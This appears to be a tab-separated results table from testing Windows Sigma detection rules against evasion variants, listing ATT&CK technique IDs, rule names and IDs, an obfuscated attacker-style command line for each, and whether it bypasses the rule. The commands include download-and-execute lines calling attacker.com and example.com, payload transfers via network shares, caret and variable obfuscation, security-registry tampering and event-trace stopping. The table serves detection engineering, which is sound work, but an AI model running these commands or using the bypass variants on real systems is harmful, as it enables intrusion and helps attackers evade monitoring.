Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1059.003	proc_creation_win_cmd_dosfuscation	Potential Dosfuscation Activity	a77c1610-fc73-4019-8e29-0f51efc04a51		"cmd.exe /c ""s""e""t OBJ=calc.exe && %O%B%J%"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_stdin_redirect	Read Contents From Stdin Via Cmd.EXE	241e802a-b65e-484f-88cd-c2dc10f9206d		"for /f ""tokens=*"" %i in (payload.txt) do cmd.exe /c %i"	TRUE	TRUE	TRUE	
t1059.003	proc_creation_win_cmd_stdin_redirect	Read Contents From Stdin Via Cmd.EXE	241e802a-b65e-484f-88cd-c2dc10f9206d		type payload.txt | cmd.exe	TRUE	TRUE	TRUE	
t1059.003	proc_creation_win_hktl_cobaltstrike_bloopers_modules	Operator Bloopers Cobalt Strike Modules	4f154fb6-27d1-4813-a759-78b93e0b9c48		"cmd.exe /c ""set a=Invoke-&set b=UserHunter&call powershell -c %a%%b%"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_redmimicry_winnti_playbook	HackTool - RedMimicry Winnti Playbook Execution	95022b85-ff2a-49fa-939a-d7b8f56eeb9b		"cmd.exe /c ""C:\Windows\Temp\t^mp.bat"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_redmimicry_winnti_playbook	HackTool - RedMimicry Winnti Playbook Execution	95022b85-ff2a-49fa-939a-d7b8f56eeb9b		rundll32.exe C:\temp\custom_module.dll,Main	TRUE	TRUE	TRUE	
t1059.003	proc_creation_win_hktl_redmimicry_winnti_playbook	HackTool - RedMimicry Winnti Playbook Execution	95022b85-ff2a-49fa-939a-d7b8f56eeb9b		"cmd.exe /c ""cd C:\Windows\Temp && tmp.bat"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_redmimicry_winnti_playbook	HackTool - RedMimicry Winnti Playbook Execution	95022b85-ff2a-49fa-939a-d7b8f56eeb9b		rundll32.exe C:\Windows\Temp\renamed_payload.dll,DllMain	TRUE	TRUE	TRUE	
t1059.003	proc_creation_win_remote_access_tools_screenconnect_remote_execution	Remote Access Tool - ScreenConnect Remote Command Execution	b1f73849-6329-4069-bc8f-78a604bb8b23		"cmd.exe /c ""C:\Windows\TEMP\HiddenPath\23.6.8.8644\3c41d689-bbf5-4216-b2f4-ba8fd6192c25run.cmd"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_remote_access_tools_screenconnect_remote_execution	Remote Access Tool - ScreenConnect Remote Command Execution	b1f73849-6329-4069-bc8f-78a604bb8b23		rundll32.exe C:\Windows\TEMP\ScreenConnect\23.6.8.8644\malicious.dll,Start	TRUE	TRUE	TRUE	
t1059.005	proc_creation_win_susp_gather_network_info_execution	Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS	07aa184a-870d-413d-893a-157f317f6f58		"cmd.exe /c ""set str1=gather & set str2=NetworkInfo.vbs & call wscript.exe C:\Windows\System32\%str1%%str2%"""	FALSE	FALSE	FALSE	
t1059.005	proc_creation_win_susp_shell_spawn_susp_program	Windows Shell/Scripting Processes Spawning Suspicious Programs	3a6586ad-127a-4d3b-a677-1e6eacdf8fde		cmd.exe /c nslookup.exe example.com	TRUE	TRUE	TRUE	
t1059.005	proc_creation_win_wscript_cscript_dropper	Potential Dropper Script Execution Via WScript/CScript	cea72823-df4d-4567-950c-0b579eaf0846		cscript.exe C:\ProgramData\payload.js	TRUE	TRUE	TRUE	
t1059.007	proc_creation_win_hh_susp_execution	Suspicious HH.EXE Execution	e8a95b5e-c891-46e2-b33a-93937d3abc31		"cmd.exe /c ""cd %USERPROFILE%\Downloads && hh.exe payload.chm"""	FALSE	FALSE	FALSE	
t1059.007	proc_creation_win_node_adobe_creative_cloud_abuse	Node Process Executions	df1f26d3-bea7-4700-9ea2-ad3e990cf90e		"cd ""C:\Program Files\Adobe\Adobe Creative Cloud Experience\libs\"" && .\node.exe -e ""require('os')"""	TRUE	TRUE	TRUE	
t1059.007	proc_creation_win_node_adobe_creative_cloud_abuse	Node Process Executions	df1f26d3-bea7-4700-9ea2-ad3e990cf90e		"copy ""C:\Program Files\Adobe\Adobe Creative Cloud Experience\libs\node.exe"" %TEMP%\not_node.exe && %TEMP%\not_node.exe -e ""require('child_process').exec('calc.exe')"""	TRUE	TRUE	TRUE	
t1059.007	proc_creation_win_wscript_cscript_dropper	Potential Dropper Script Execution Via WScript/CScript	cea72823-df4d-4567-950c-0b579eaf0846		"cmd.exe /c ""cd /d C:\Users\Public\ && cscript script.vbs"""	FALSE	FALSE	FALSE	
t1059.007	proc_creation_win_wscript_cscript_uncommon_extension_exec	Cscript/Wscript Uncommon Script Extension Execution	99b7460d-c9f1-40d7-a316-1f36f61d52ee		copy script.vbs script.vbs.txt && cscript //e:vbs script.vbs.txt	TRUE	TRUE	TRUE	
t1059.020	proc_creation_win_mshta_inline_vbscript	Wscript Shell Run In CommandLine	2c28c248-7f50-417a-9186-a85b223010ee		"cmd.exe /c ""set a=Wscript.&& set b=Shell&& set c=Run&& call echo %a%%b%.%c%"""	FALSE	FALSE	FALSE	
t1059.022	proc_creation_win_mshta_inline_vbscript	Wscript Shell Run In CommandLine	2c28c248-7f50-417a-9186-a85b223010ee		wscript.exe C:\path\to\malicious_script.vbs	TRUE	TRUE	TRUE	
t1059.023	proc_creation_win_office_outlook_enable_unsafe_client_mail_rules	Outlook EnableUnsafeClientMailRules Setting Enabled	55f0a3a1-846e-40eb-8273-677371b8d912		"cmd.exe /c ""reg add HKCU\Software\Microsoft\Office\16.0\Outlook\Security /v EnableUn^safeClientMailRules /t REG_DWORD /d 1 /f"""	FALSE	FALSE	FALSE	
t1059.026	proc_creation_win_office_outlook_enable_unsafe_client_mail_rules	Outlook EnableUnsafeClientMailRules Setting Enabled	55f0a3a1-846e-40eb-8273-677371b8d912		"reg.exe add ""HKCU\Software\Policies\Microsoft\Office\16.0\Outlook\Security"" /v EnableUnsafeClientMailRules /t REG_DWORD /d 1 /f"	FALSE	FALSE	FALSE	
t1059.027	proc_creation_win_office_outlook_enable_unsafe_client_mail_rules	Outlook EnableUnsafeClientMailRules Setting Enabled	55f0a3a1-846e-40eb-8273-677371b8d912		"set ""p1=EnableUnsafe"" && set ""p2=ClientMailRules"" && reg add ""HKCU\Software\Policies\Microsoft\Office\16.0\Outlook\Security"" /v %p1%%p2% /t REG_DWORD /d 1 /f"	TRUE	TRUE	TRUE	
t1059.040	proc_creation_win_python_pty_spawn	Python Spawning Pretty TTY on Windows	480e7e51-e797-47e3-8d72-ebfce65b6d8d	"C:\Users\thaim\AppData\Local\Programs\Python\Python314\python.exe  -c \""import pty; pty.spawn('/bin/sh')\"""	"py.exe -c ""import pty; pty.spawn('/bin/sh')"""	TRUE	FALSE	FALSE	Python Spawning Pretty TTY on Windows (480e7e51-e797-47e3-8d72-ebfce65b6d8d); Python Inline Command Execution (899133d5-4d7c-4a7f-94ee-27355c879d90)
t1059.046	proc_creation_win_renamed_pingcastle	Renamed PingCastle Binary Execution	2433a154-bb3d-42e4-86c3-a26bdac91c45		"cmd.exe /c ""audit_tool.exe --s^canner a^clcheck"""	FALSE	FALSE	FALSE	
t1059.050	proc_creation_win_ruby_inline_command_execution	Ruby Inline Command Execution	20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8		"echo puts ""Test Execution"" | ruby.exe"	TRUE	TRUE	TRUE	
t1059.059	proc_creation_win_susp_hiding_malware_in_fonts_folder	Writing Of Malicious Files To The Fonts Folder	ae9b0bd7-8888-4606-b444-0ed7410cb728		copy C:\temp\payload.dll %windir%\Fonts\	TRUE	TRUE	TRUE	
t1059.061	proc_creation_win_susp_hiding_malware_in_fonts_folder	Writing Of Malicious Files To The Fonts Folder	ae9b0bd7-8888-4606-b444-0ed7410cb728		move C:\temp\payload.exe C:\Windows\Fonts\	TRUE	TRUE	TRUE	
t1059.063	proc_creation_win_susp_hiding_malware_in_fonts_folder	Writing Of Malicious Files To The Fonts Folder	ae9b0bd7-8888-4606-b444-0ed7410cb728		move C:\temp\payload.exe C:\Windows\Fonts\payload.exe	TRUE	TRUE	TRUE	
t1059.067	proc_creation_win_susp_script_exec_from_env_folder	Script Interpreter Execution From Suspicious Folder	1228c958-e64e-4e71-92ad-7d429f4138ba		"cmd.exe /c ""cd C:\Users\Public && wscript.exe payload.vbs"""	FALSE	FALSE	FALSE	
t1059.069	proc_creation_win_susp_script_exec_from_env_folder	Script Interpreter Execution From Suspicious Folder	1228c958-e64e-4e71-92ad-7d429f4138ba		mshta.exe C:/Users/Public/payload.hta	TRUE	TRUE	TRUE	
t1059.078	proc_creation_win_vmware_vmtoolsd_susp_child_process	VMToolsd Suspicious Child Process	5687f942-867b-4578-ade7-1e341c46e99a		"cmd.exe /c ""REM \VMware\VMware Tools\poweron-vm-default.bat && calc.exe"""	FALSE	FALSE	FALSE	
t1069.002	proc_creation_win_hktl_sharpview	HackTool - SharpView Execution	b2317cfa-4a47-4ead-b3ff-297438c0bc2d		C:\Windows\System32\Notepad.exe	TRUE	TRUE	TRUE	
t1070.001	proc_creation_win_logman_disable_eventlog	Suspicious Windows Trace ETW Session Tamper Via Logman.EXE	cd1f961e-0b96-436b-b7c6-38da4583ec00		"cmd.exe /c ""logman s^top ""SYSMON TRACE"" -ets"""	TRUE	TRUE	TRUE	
t1070.002	proc_creation_win_fsutil_usage	Fsutil Suspicious Invocation	add64136-62e5-48ea-807e-88638d02df1e		notepad.exe	TRUE	TRUE	TRUE	
t1070.004	proc_creation_win_cmd_del_execution	File Deletion Via Del	379fa130-190e-4c3f-b7bc-6c8e834485f3		C:\Windows\System32\cmd.exe /c del %TEMP%\*.tmp	TRUE	TRUE	TRUE	
t1070.004	proc_creation_win_cmd_del_greedy_deletion	Greedy File Deletion Using Del	204b17ae-4007-471b-917b-b917b315c5db		"cmd.exe /c ""cd C:\ProgramData && del *.dll"""	FALSE	FALSE	FALSE	
t1070.004	proc_creation_win_cmd_ping_del_combined_execution	Suspicious Ping/Del Command Combination	54786ddc-5b8a-11ed-9b6a-0242ac120002		ping 127.0.0.1 -n 5 > NUL && del lockbit.exe	TRUE	TRUE	TRUE	
t1070.004	proc_creation_win_cmd_rmdir_execution	Directory Removal Via Rmdir	41ca393d-538c-408a-ac27-cf1e038be80c		cmd.exe /c rd /s /q C:\temp\malicious_folder	TRUE	TRUE	TRUE	
t1071.001	proc_creation_win_vscode_tunnel_renamed_execution	Renamed Visual Studio Code Tunnel Execution	2cf29f11-e356-4f61-98c0-1bdb9393d6da		"""C:\Windows\System32\cmd.exe"" /c ""notepad.exe"""	FALSE	FALSE	FALSE	
t1071.001	proc_creation_win_vscode_tunnel_service_install	Visual Studio Code Tunnel Service Installation	30bf1789-379d-4fdc-900f-55cd0a90a801		copy code.exe not_code.exe && not_code.exe tunnel service internal-run --log-file bypass.log	TRUE	TRUE	TRUE	
t1082.005	proc_creation_win_hktl_winpwn	HackTool - WinPwn Execution	d557dc06-62e8-4468-a8e8-7984124908ce		C:\Windows\System32\cmd.exe /c Start C:\Temp\WinPwn_Tool.exe -recon	TRUE	TRUE	TRUE	
t1082.006	proc_creation_win_nslookup_domain_discovery	Network Reconnaissance Activity	e6313acd-208c-44fc-a0ff-db85d572e90e		C:\Windows\System32\cmd.exe /c nslookup -type=MX example.com	TRUE	TRUE	TRUE	
t1082.009	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f		"cmd /c reg query ""HKLM\SOFTWARE\Microsoft\Cryptography"""	TRUE	TRUE	TRUE	
t1082.014	proc_creation_win_wmic_recon_system_info_uncommon	Uncommon System Information Discovery Via Wmic.EXE	9d5a1274-922a-49d0-87f3-8c653483b909		"for /f ""tokens=*"" %a in ('wmic logicaldisk get name^,size^,freespace ^| findstr [A-Z]') do @echo %a"	TRUE	TRUE	TRUE	
t1082.015	proc_creation_win_wmic_recon_system_info_uncommon	Uncommon System Information Discovery Via Wmic.EXE	9d5a1274-922a-49d0-87f3-8c653483b909		"wmic LOGICALDISK where ""Name='C:'"" get Name,Size,FreeSpace /format:csv"	FALSE	FALSE	FALSE	
t1082.016	proc_creation_win_wmic_recon_system_info_uncommon	Uncommon System Information Discovery Via Wmic.EXE	9d5a1274-922a-49d0-87f3-8c653483b909		wmic os get Caption /value && wmic os get OSArchitecture /value && wmic os get Version /value	FALSE	FALSE	FALSE	
t1082.017	proc_creation_win_wmic_recon_volume	System Disk And Volume Reconnaissance Via Wmic.EXE	c79da740-5030-45ec-a2e0-479e824a562c		"wmic.exe fsdir where ""drive='C:'"" get name,filesize"	FALSE	FALSE	FALSE	
t1082.018	proc_creation_win_wmic_recon_volume	System Disk And Volume Reconnaissance Via Wmic.EXE	c79da740-5030-45ec-a2e0-479e824a562c		wmic.exe logicaldisk list brief	FALSE	FALSE	FALSE	
t1082.019	proc_creation_win_wmic_recon_volume	System Disk And Volume Reconnaissance Via Wmic.EXE	c79da740-5030-45ec-a2e0-479e824a562c		wmic.exe partition get name,size	FALSE	FALSE	FALSE	
t1083.001	proc_creation_win_notepad_local_passwd_discovery	Notepad Password Files Discovery	3b4e950b-a3ea-44d3-877e-432071990709		"C:\Windows\System32\notepad.exe ""C:\Data\passwords.csv"""	TRUE	TRUE	TRUE	
t1083.002	proc_creation_win_notepad_local_passwd_discovery	Notepad Password Files Discovery	3b4e950b-a3ea-44d3-877e-432071990709		cmd.exe /c notepad.exe C:\Users\admin\Documents\passwords.txt	TRUE	TRUE	TRUE	
t1083.003	proc_creation_win_notepad_local_passwd_discovery	Notepad Password Files Discovery	3b4e950b-a3ea-44d3-877e-432071990709		notepad.exe C:\secure\passwords.bak	TRUE	TRUE	TRUE	
t1083.007	proc_creation_win_pua_seatbelt	PUA - Seatbelt Execution	38646daa-e78f-4ace-9de0-55547b2d30da		rundll32.exe C:\Data\Seatbelt.dll,main FullDFIR	TRUE	TRUE	TRUE	
t1087.001	proc_creation_win_net_groups_and_accounts_recon	Suspicious Group And Account Reconnaissance Activity Using Net.EXE	d95de845-b83c-4a9a-8a6a-4fc802ebf6c0		net user /domain	TRUE	TRUE	TRUE	
t1087.002	proc_creation_win_hktl_bloodhound_sharphound	HackTool - Bloodhound/Sharphound Execution	f376c8a7-a2d0-4ddc-aa0c-16c17236d962		"copy SharpHound.exe not_suspicious.exe; .\not_suspicious.exe --collectionmethods ""Default"" --domain ""contoso.local"" --zipfilename:""data.zip"""	TRUE	TRUE	TRUE	
t1090.001	proc_creation_win_pua_chisel	PUA - Chisel Tunneling Tool Execution	8b0e12da-d3c3-49db-bb4f-256703f380e5		rundll32.exe chisel.dll,server 8080	TRUE	TRUE	TRUE	
t1090.014	proc_creation_win_qemu_suspicious_execution	Potentially Suspicious Usage Of Qemu	5fc297ae-25b6-488a-8f25-cc12ac29b744		"cmd.exe /c ""qemu-system-i386.exe -m 1M -netdev user,id=n1,restrict=off,connect=10.0.0.5:80 -nographic & REM  -cdrom """	FALSE	FALSE	FALSE	
t1098.010	proc_creation_win_wmi_password_never_expire	Password Set to Never Expire via WMI	7864a175-3654-4824-9f0d-f0da18ab27c0		wmic useraccount where name='guest' set passwordexpires=0	FALSE	FALSE	FALSE	
t1102.011	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		"cmd.exe /c ""set TUNNEL_TOKEN=eyJhbGci... && cloudflared.exe tunnel run"""	FALSE	FALSE	FALSE	
t1102.018	proc_creation_win_java_manageengine_susp_child_process	Suspicious Child Process Of Manage Engine ServiceDesk	cea2b7ea-792b-405f-95a1-b903ea06458f		"cmd.exe /c ""set TUNNEL_TOKEN=eyJhbGci... && cloudflared.exe tunnel run"""	FALSE	FALSE	FALSE	
t1105.001	proc_creation_win_browsers_chromium_headless_exec	Browser Execution In Headless Mode	ef9dcfed-690c-4c5d-a9d1-482cd422225c		"copy ""C:\Program Files\Google\Chrome\Application\chrome.exe"" ""C:\temp\svchost_browser.exe"" && ""C:\temp\svchost_browser.exe"" --headless https://example.com"	TRUE	TRUE	TRUE	
t1105.005	proc_creation_win_browsers_chromium_headless_exec	Browser Execution In Headless Mode	ef9dcfed-690c-4c5d-a9d1-482cd422225c		wmic useraccount where name='guest' set passwordexpires=0	FALSE	FALSE	FALSE	
t1105.007	proc_creation_win_browsers_chromium_headless_file_download	File Download with Headless Browser	0e8cfe08-02c9-4815-a2f8-0d157b7ed33e		"cmd.exe /c copy ""C:\Program Files\Google\Chrome\Application\chrome.exe"" C:\Temp\sysupdate.exe && C:\Temp\sysupdate.exe --headless --dump-dom http://example.com/payload.txt"	TRUE	TRUE	TRUE	
t1105.008	proc_creation_win_browsers_chromium_headless_file_download	File Download with Headless Browser	0e8cfe08-02c9-4815-a2f8-0d157b7ed33e		"copy ""C:\Program Files\Google\Chrome\Application\chrome.exe"" C:\Windows\Temp\sysupdate.exe & C:\Windows\Temp\sysupdate.exe --headless --dump-dom https://example.com/file.txt"	FALSE	FALSE	FALSE	
t1105.013	proc_creation_win_browsers_inline_file_download	File Download From Browser Process Via Inline URL	94771a71-ba41-4b6e-a757-b531372eaab6		"cmd.exe /c copy ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" C:\Temp\sysupdate.exe && C:\Temp\sysupdate.exe http://example.com/payload.exe"	TRUE	TRUE	TRUE	
t1105.034	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		cmd.exe /c curl.exe http://example.com/payload.exe -o payload.exe & payload.exe	TRUE	TRUE	TRUE	
t1105.044	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c t^yp^e C:\temp\data.txt > \\webdav.server.local\share\data.txt	FALSE	FALSE	FALSE	
t1105.045	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		"cmd.exe /c type ""\\malicious.server.com\share\payload.exe"" > C:\payload.exe"	TRUE	TRUE	TRUE	
t1105.046	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c type \\live.sysinternals.com\tools\Procmon.exe>C:\temp\Procmon.exe	TRUE	TRUE	TRUE	
t1105.047	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c type \\malicious.server.com\share\payload.exe>>C:\payload.exe	TRUE	TRUE	TRUE	
t1105.048	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c type C:\payload.exe>\\malicious.server.com\share\uploaded.exe	FALSE	FALSE	FALSE	
t1105.049	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c type C:\temp\data.txt >\\webdav.server.local\share\data.txt	FALSE	FALSE	FALSE	
t1105.051	proc_creation_win_curl_susp_download	Suspicious Curl.EXE Download	e218595b-bbe7-4ee5-8a96-f32a24ad3468		cmd.exe /c cd %TEMP% && curl.exe -s -o payload.exe http://example.com/payload.exe	TRUE	TRUE	TRUE	
t1105.052	proc_creation_win_curl_susp_download	Suspicious Curl.EXE Download	e218595b-bbe7-4ee5-8a96-f32a24ad3468		curl.exe --create-dirs -o C:\Windows\Tasks\payload.dll http://example.com/payload.dll?download=1	TRUE	TRUE	TRUE	
t1105.066	proc_creation_win_desktopimgdownldr_susp_execution	Suspicious Desktopimgdownldr Command	bb58aa4a-b80b-415a-a2c0-2f65a4c81009		"reg.exe delete HKCU\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\Cache\DefaultAccount\""PersonalizationCSP"""	TRUE	TRUE	TRUE	
t1105.081	proc_creation_win_findstr_subfolder_search	Insensitive Subfolder Search Via Findstr.EXE	04936b66-3915-43ad-a8e5-809eadfd1141		"findstr.exe -si ""password"" C:\*.txt"	TRUE	TRUE	TRUE	
t1105.097	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\IEExec.exe %TEMP%\not_ieexec.exe && %TEMP%\not_ieexec.exe http://example.com/payload.exe	TRUE	TRUE	TRUE	
t1105.107	proc_creation_win_lolbin_extrac32	Suspicious Extrac32 Execution	aa8e035d-7be4-48d3-a944-102aec04400d		extrac32.exe /C \\127.0.0.1\share\archive.zip C:\path\to\extract\file.txt	TRUE	TRUE	TRUE	
t1112.017	proc_creation_win_reg_lsa_disable_restricted_admin	RestrictedAdminMode Registry Value Tampering - ProcCreation	28ac00d6-22d9-4a3c-927f-bbd770104573		"set ""p1=Disable"" && set ""p2=RestrictedAdmin"" && reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Lsa"" /v %p1%%p2% /t REG_DWORD /d 0 /f"	TRUE	TRUE	TRUE	
t1112.027	proc_creation_win_regedit_import_keys	Imports Registry Key From a File	73bba97f-a82d-42ce-b315-9182e76c57b1		"reg.exe import ""C:\path\to\malicious.reg"""	TRUE	TRUE	TRUE	
t1112.029	proc_creation_win_regedit_import_keys_ads	Imports Registry Key From an ADS	0b80ade5-6997-4b1d-99a1-71701778ea61		"copy regedit.exe trusted.exe && trusted.exe /s ""C:\temp\file.txt:payload.reg"""	TRUE	TRUE	TRUE	
t1112.031	proc_creation_win_regedit_import_keys_ads	Imports Registry Key From an ADS	0b80ade5-6997-4b1d-99a1-71701778ea61		"reg.exe import ""C:\path\to\file.txt:hidden.reg"""	TRUE	TRUE	TRUE	
t1112.034	proc_creation_win_regini_ads	Suspicious Registry Modification From ADS Via Regini.EXE	77946e79-97f1-45a2-84b4-f37b5c0d8682		reg.exe import C:\path\to\registry_file.reg	TRUE	TRUE	TRUE	
t1112.037	proc_creation_win_regini_execution	Registry Modification Via Regini.EXE	5f60740a-f57b-4e76-82a1-15b6ff2cb134		"reg.exe add ""HKEY_LOCAL_MACHINE\SOFTWARE\Example"" /v ""Value"" /t REG_SZ /d ""Data"""	TRUE	TRUE	TRUE	
t1112.041	proc_creation_win_runonce_execution	Run Once Task Execution as Configured in Registry	198effb6-6c98-4d0c-9ea3-451fa143c45c		C:\Windows\System32\runonce.exe /Config	TRUE	TRUE	TRUE	
t1119.001	proc_creation_win_susp_automated_collection	Automated Collection Command Prompt	f576a613-2392-4067-9d1a-9345fb58d8d1		"findstr.exe /S "".docx"" C:\Users\*.*"	TRUE	TRUE	TRUE	
t1119.002	proc_creation_win_susp_automated_collection	Automated Collection Command Prompt	f576a613-2392-4067-9d1a-9345fb58d8d1		for /r C:\Users\ %i in (*.doc*) do @echo %i	TRUE	TRUE	TRUE	
t1127.007	proc_creation_win_aspnet_compiler_susp_paths	Potentially Suspicious ASP.NET Compilation Via AspNetCompiler	9f50fe98-fe5c-4a2d-86c7-fad7f63ed622 # Susp Paths		copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe C:\Users\%USERNAME%\Documents\not_suspicious.exe && C:\Users\%USERNAME%\Documents\not_suspicious.exe -v / -p C:\Users\Public\MaliciousSite C:\Windows\Temp\Compiled	TRUE	TRUE	TRUE	
t1127.008	proc_creation_win_aspnet_compiler_susp_paths	Potentially Suspicious ASP.NET Compilation Via AspNetCompiler	9f50fe98-fe5c-4a2d-86c7-fad7f63ed622 # Susp Paths		subst Z: C:\Users\Public\Payload && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v / -p Z:\ C:\Windows\Temp\Output	TRUE	TRUE	TRUE	
t1127.012	proc_creation_win_ilasm_il_code_compilation	C# IL Code Compilation Via Ilasm.EXE	850d55f9-6eeb-4492-ad69-a72338f65ba4		copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe C:\Users\Public\not_ilasm.exe && C:\Users\Public\not_ilasm.exe /output:malicious.dll malicious.il	TRUE	TRUE	TRUE	
t1134.002	proc_creation_win_hktl_meterpreter_getsystem	Potential Meterpreter/CobaltStrike Activity	15619216-e993-4721-b590-4c520615a67d		%COMSPEC% /c e^cho 559891bb017 > \\.\\pipe\\5e120a	TRUE	TRUE	TRUE	
t1134.002	proc_creation_win_hktl_meterpreter_getsystem	Potential Meterpreter/CobaltStrike Activity	15619216-e993-4721-b590-4c520615a67d		rundll32.exe C:\Windows\Temp\payload.dll, a /p:tmexsn	TRUE	TRUE	TRUE	
t1135.001	proc_creation_win_explorer_folder_shortcut_via_shell_binary	File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell	c3d76afc-93df-461e-8e67-9b2bad3f2ac4		copy C:\Windows\explorer.exe %temp%\file_manager.exe && %temp%\file_manager.exe shell:mycomputerfolder	TRUE	TRUE	TRUE	
t1135.002	proc_creation_win_explorer_folder_shortcut_via_shell_binary	File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell	c3d76afc-93df-461e-8e67-9b2bad3f2ac4		explorer.exe ::{20D04FE0-3AEA-1069-A2D8-08002B30309D}	TRUE	TRUE	TRUE	
t1202.002	proc_creation_win_bash_command_execution	Indirect Inline Command Execution Via Bash.EXE	5edc2273-c26f-406c-83f3-f4d948e740dd		echo whoami | C:\Windows\System32\bash.exe	FALSE	FALSE	FALSE	
t1202.013	proc_creation_win_conhost_legacy_option	Suspicious High IntegrityLevel Conhost Legacy Option	3037d961-21e9-4732-b27a-637bcc7bf539		conhost 0xffffffff -ForceV1	TRUE	TRUE	TRUE	
t1202.023	proc_creation_win_office_exec_from_trusted_locations	Potentially Suspicious Office Document Executed From Trusted Location	f99abdf0-6283-4e71-bd2b-b5c048a94743		"cmd.exe /c ""start winword.exe C:\Users\Admin\AppData\Roaming\Microsoft\Templates\malicious.docm"""	FALSE	FALSE	FALSE	
t1202.026	proc_creation_win_office_winword_dll_load	Potential Arbitrary DLL Load Using Winword	f7375e28-5c14-432f-b8d1-1db26c832df3		"cmd.exe /c ""WINWORD.EXE /^l payload.dll"""	FALSE	FALSE	FALSE	
t1202.039	proc_creation_win_splwow64_cli_anomaly	Suspicious Splwow64 Without Params	1f1a8509-2cbb-44f5-8751-8e1571518ce2		"""C:\Windows\splwow64.exe"""	FALSE	FALSE	FALSE	
t1202.042	proc_creation_win_vshadow_exec	Proxy Execution via Vshadow	d7c75059-2901-4578-b209-8837fd31c6a8		cmd.exe /c vshadow.exe -e^xec=C:\temp\payload.exe	FALSE	FALSE	FALSE	
t1204.002	proc_creation_win_susp_browser_launch_from_document_reader_process	Potential Suspicious Browser Launch From Document Reader Process	1193d960-2369-499f-a158-7b50a31df682		cmd.exe /c start chrome.exe http://attacker.com	TRUE	TRUE	TRUE	
t1204.002	proc_creation_win_susp_lnk_exec_hidden_cmd	Suspicious LNK Command-Line Padding with Whitespace Characters	dd8756e7-a3a0-4768-b47e-8f545d1a751c		"C:\Windows\System32\cmd.exe /c ""certutil.exe -urlcache -f http://attacker.com/payload.exe C:\temp\p.exe && C:\temp\p.exe"""	FALSE	FALSE	FALSE	
t1204.002	proc_creation_win_susp_lnk_exec_hidden_cmd	Suspicious LNK Command-Line Padding with Whitespace Characters	dd8756e7-a3a0-4768-b47e-8f545d1a751c		"C:\Windows\System32\cmd.exe /c ""powershell.exe -Command Write-Host 'Malicious Payload Executed'"""	FALSE	FALSE	FALSE	
